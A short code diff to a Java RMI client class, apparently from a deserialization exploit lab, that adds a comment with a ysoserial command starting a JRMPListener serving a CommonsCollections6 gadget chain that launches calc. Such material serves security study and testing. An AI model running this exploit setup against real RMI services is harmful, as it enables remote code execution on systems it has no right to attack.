@@ -10,6 +10,9 @@ import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObjectInvocationHandler;
 import java.util.Random;
 
+/*
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'calc'
+ */
 public class DefineClient {
     public static void main(String[] args) throws Exception {
         Registry registry = LocateRegistry.getRegistry(1099);
